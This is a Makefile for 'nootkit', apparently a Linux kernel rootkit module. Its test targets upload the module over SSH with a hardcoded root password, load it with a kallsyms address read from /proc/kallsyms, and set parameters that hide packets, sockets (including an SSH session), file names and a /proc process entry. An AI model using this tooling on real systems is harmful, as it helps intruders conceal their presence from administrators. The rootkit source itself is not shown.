KDIR := ${PWD}/kernel-headers/linux-headers-5.15.0-76-generic
obj-m := nootkit.o
nootkit-y := src/nootkit_main.o src/ksyms.o src/config.o
nootkit-y += src/hide/readdir.o src/hide/proc_net.o src/hide/net.o
nootkit-y += src/arch/x86_64/hook.o src/arch/x86_64/mm.o
nootkit-y += src/arch/x86_64/hide/readdir_sys.o

ccflags-y := -I$(src)/src

TEST_IP := 192.168.122.122

default: build

build:
	make -C ${KDIR} M=${PWD} modules

clean:
	make -C ${KDIR} M=${PWD} clean

test-remove:
	-sshpass -pa ssh root@${TEST_IP} "rmmod nootkit"
	-sshpass -pa ssh root@${TEST_IP} "rm /nootkit.ko"

test-upload: build
	sshpass -pa scp nootkit.ko root@${TEST_IP}:/

test-hide-packets: build test-remove test-upload
	sshpass -pa ssh root@${TEST_IP} \
	insmod /nootkit.ko \
	' \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	"hide_packets=\" \
	ETH PROTO = 0; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 6; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:1300-1350;, \
	ETH PROTO = 0806; ETH SRC = 00:00:00:00:00:00; ETHDST = 00:00:00:00:00:00; IPPROTO = 0; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:0-65535; \
	\"" \
	"hide_sockets=\" \
	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535; \
	\"" \
	'

test-hide-socket: build test-remove test-upload
	sshpass -pa ssh root@${TEST_IP} \
	insmod /nootkit.ko \
	' \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	"hide_sockets=\" \
	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:1300-1400; FOREIGN = 0.0.0.0/0.0.0.0:0-65535;, \
	IPPROTO = 6; LOCAL = 0.0.0.0/0.0.0.0:22-22; FOREIGN = 192.168.122.1/255.255.255.255:48526-48526; \
	\"" \
	'

test-hide-filename: build test-remove test-upload
	sshpass -pa ssh root@${TEST_IP} \
	insmod /nootkit.ko \
	' \
	kallsyms_lookup_name=0x$$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
	hide_filenames=hello,/root/yellow,/proc/5403,/root/hallo \
	'

# test: test-hide-filename test-hide-socket
